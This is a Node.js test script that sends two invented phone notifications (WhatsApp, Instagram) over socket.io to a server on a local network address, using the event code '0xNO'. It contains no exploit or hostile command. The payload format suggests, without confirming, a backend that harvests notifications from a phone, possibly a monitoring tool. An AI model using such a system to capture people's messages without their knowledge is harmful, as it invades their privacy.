// Debug script to monitor server notifications
const io = require('socket.io-client');

const SERVER_URL = 'http://192.168.1.200:9400';

console.log('🔍 Debugging Server Notification Response');
console.log('==========================================');

const socket = io(SERVER_URL, {
    transports: ['polling', 'websocket'],
    timeout: 10000,
    reconnection: false
});

socket.on('connect', () => {
    console.log('✅ Connected to server');
    console.log('📡 Socket ID:', socket.id);
    
    // Send multiple test notifications
    const testNotifications = [
        {
            type: 'realtime',
            timestamp: Date.now(),
            isRealtime: true,
            listenerEnabled: true,
            data: {
                key: 'test_whatsapp_' + Date.now(),
                packageName: 'com.whatsapp',
                appName: 'WhatsApp',
                title: 'John Doe',
                text: 'Hey, how are you?',
                content: 'Title: John Doe\nText: Hey, how are you?',
                postTime: Date.now(),
                timestamp: Date.now(),
                postTimeFormatted: new Date().toISOString().replace('T', ' ').substring(0, 19),
                isImportant: true,
                category: 'Messaging',
                priority: 'DEFAULT'
            }
        },
        {
            type: 'realtime',
            timestamp: Date.now(),
            isRealtime: true,
            listenerEnabled: true,
            data: {
                key: 'test_instagram_' + Date.now(),
                packageName: 'com.instagram.android',
                appName: 'Instagram',
                title: 'New Story',
                text: 'Sarah posted a new story',
                content: 'Title: New Story\nText: Sarah posted a new story',
                postTime: Date.now(),
                timestamp: Date.now(),
                postTimeFormatted: new Date().toISOString().replace('T', ' ').substring(0, 19),
                isImportant: true,
                category: 'Social Media',
                priority: 'HIGH'
            }
        }
    ];
    
    let notificationCount = 0;
    
    const sendNotification = () => {
        if (notificationCount < testNotifications.length) {
            const notification = testNotifications[notificationCount];
            console.log(`\n📤 Sending notification ${notificationCount + 1}/${testNotifications.length}...`);
            console.log('📱 App:', notification.data.appName);
            console.log('📝 Title:', notification.data.title);
            
            socket.emit('0xNO', notification);
            notificationCount++;
            
            setTimeout(sendNotification, 3000); // Send next notification in 3 seconds
        } else {
            console.log('\n✅ All test notifications sent!');
            console.log('🔍 Check the server console for notification output...');
            
            setTimeout(() => {
                console.log('\n📊 Test completed');
                socket.disconnect();
                process.exit(0);
            }, 5000);
        }
    };
    
    // Start sending notifications after 2 seconds
    setTimeout(sendNotification, 2000);
});

socket.on('connect_error', (err) => {
    console.log('❌ Connection error:', err.message);
    process.exit(1);
});

socket.on('disconnect', () => {
    console.log('🔌 Disconnected from server');
});

socket.on('error', (err) => {
    console.log('❌ Socket error:', err);
    process.exit(1);
});
